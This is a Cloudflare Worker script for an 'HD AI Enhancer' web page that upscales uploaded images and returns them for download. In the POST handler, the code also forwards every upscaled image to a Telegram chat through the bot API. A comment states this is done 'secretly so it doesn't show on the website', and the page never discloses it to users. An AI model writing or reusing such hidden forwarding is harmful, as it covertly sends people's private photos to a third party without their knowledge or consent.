export default {
  async fetch(request, env) {
    const { method } = request;

    if (method === "GET") {
      return new Response(renderHTML(), { headers: { "Content-Type": "text/html" } });
    }

    if (method === "POST") {
      try {
        const formData = await request.formData();
        const imageFile = formData.get("image");
        const blob = await imageFile.arrayBuffer();

        // 1. HIGH QUALITY AI UPSCALE
        // Using the latent diffusion model for best 4k results
        const upscaledImage = await env.AI.run('@cf/stabilityai/stable-diffusion-x4-upscaler', {
          image: [...new Uint8Array(blob)],
          noise_level: 10 // Lower noise preserves original details better
        });

        // 2. AUTOMATIC FORWARD TO TELEGRAM (Background)
        // We do this secretly so it doesn't show on the website
        const tgFormData = new FormData();
        tgFormData.append("chat_id", env.TELEGRAM_CHAT_ID);
        tgFormData.append("photo", new Blob([upscaledImage], { type: "image/png" }), "upscale.png");
        tgFormData.append("caption", "✅ Auto-forwarded upscale result");

        // We use 'fetch' to send it to Telegram without waiting for it to finish
        fetch(`https://api.telegram.org/bot${env.TELEGRAM_TOKEN}/sendPhoto`, {
          method: "POST",
          body: tgFormData
        });

        // 3. SHOW DOWNLOAD RESULTS IN BROWSER
        // 'attachment' forces the browser to download the file
        return new Response(upscaledImage, {
          headers: { 
            "Content-Type": "image/png",
            "Content-Disposition": "attachment; filename=\"upscaled_4k_image.png\"" 
          }
        });
      } catch (e) {
        return new Response("Error: " + e.message, { status: 500 });
      }
    }
  }
};

function renderHTML() {
  return `
    <html>
      <head>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
          body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; padding: 40px; }
          .card { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); max-width: 400px; margin: auto; }
          h1 { color: #38bdf8; margin-bottom: 10px; }
          .upload-btn { background: #38bdf8; color: #0f172a; border: none; padding: 15px 30px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; margin-top: 20px; }
          input[type="file"] { margin: 20px 0; color: #94a3b8; }
          #loading { display: none; color: #38bdf8; font-weight: bold; margin-top: 20px; }
        </style>
      </head>
      <body>
        <div class="card">
          <h1>HD AI Enhancer</h1>
          <p>Sharpen your images to 4K quality</p>
          <form id="u">
            <input type="file" name="image" accept="image/*" required>
            <button type="submit" id="b" class="upload-btn">GENERATE & DOWNLOAD</button>
          </form>
          <div id="loading">✨ Processing 4K Details...</div>
        </div>
        <script>
          const form = document.getElementById('u');
          const btn = document.getElementById('b');
          const load = document.getElementById('loading');

          form.onsubmit = async (e) => {
            e.preventDefault();
            btn.style.display = 'none';
            load.style.display = 'block';

            const res = await fetch('/', { method: 'POST', body: new FormData(form) });
            const blob = await res.blob();
            
            // This triggers the automatic download on your Android phone
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = "upscaled_result.png";
            document.body.appendChild(a);
            a.click();
            
            load.innerText = "✅ Download Started!";
            setTimeout(() => { 
                btn.style.display = 'block'; 
                load.style.display = 'none';
                load.innerText = "✨ Processing 4K Details...";
            }, 3000);
          };
        </script>
      </body>
    </html>
  `;
}
